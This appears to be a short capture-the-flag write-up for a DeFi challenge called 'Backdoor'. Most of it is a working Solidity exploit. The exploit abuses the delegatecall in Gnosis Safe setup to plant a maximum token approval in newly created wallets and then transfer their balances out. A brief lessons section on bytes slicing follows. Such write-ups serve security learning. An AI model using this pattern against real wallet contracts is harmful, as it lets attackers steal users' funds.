# Backdoor

`setUpModule` in `Safe::setup` makes a delegatecall to `to` with `data`

```solidity
contract MaliciousApprove {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract Attack {

  WalletRegistry private immutable walletRegistry;
  SafeProxyFactory private immutable factory;
  Safe private immutable masterCopy;
  IERC20 private immutable token;
  MaliciousApprove private immutable maliciousApprove;

  constructor(address _walletRegistry, address recovery, address[] memory users){
      
      // Set state variables
      walletRegistry = WalletRegistry(_walletRegistry);
      masterCopy = Safe(payable(walletRegistry.singletonCopy()));
      factory = SafeProxyFactory(walletRegistry.walletFactory());
      token = IERC20(walletRegistry.token());

      // Deploy malicious backdoor for approve
      maliciousApprove = new MaliciousApprove();

      // Create a new safe through the factory for every user

      bytes memory initializer;
      address[] memory owners = new address[](1);
      address wallet;

      for(uint256 i; i < users.length; i++) {
          
          owners[0] = users[i];
          initializer = abi.encodeCall(Safe.setup, (
              owners,
              1,
              address(maliciousApprove),
              abi.encodeCall(maliciousApprove.approve, (address(this), token)),
              address(0),
              address(0),
              0,
              payable(address(0))
          ));
          
          wallet = address(factory.createProxyWithCallback(
              address(masterCopy),
              initializer,
              0,
              walletRegistry
          ));

          token.transferFrom(wallet, recovery, token.balanceOf(wallet));
      }
  }
}
```

```solidity
    function test_backdoor() public checkSolvedByPlayer {
        new Attack(address(walletRegistry), recovery, users);
    }
```




## What learned

-  bytes slicing

```solidity
bytes memory x = 0x1234567890
// x[2:3] = 0x56
```

- Gnosis safe